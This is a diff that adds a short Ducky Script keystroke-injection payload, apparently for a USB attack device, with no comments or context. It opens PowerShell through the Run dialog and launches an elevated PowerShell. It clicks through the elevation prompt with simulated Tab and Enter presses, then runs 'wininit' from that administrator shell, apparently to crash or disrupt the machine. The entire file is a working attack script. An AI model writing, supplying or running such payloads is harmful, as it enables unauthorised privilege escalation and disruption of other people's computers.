@@ -1,0 +1,20 @@
+GUI r
+STRING powershell.exe
+DELAY 500
+ENTER
+DELAY 3500
+STRING powershell start-process powershell -verb runas
+DELAY 1500
+ENTER
+DELAY 3500
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+DELAY 2000
+STRING wininit
+DELAY 500
+ENTER
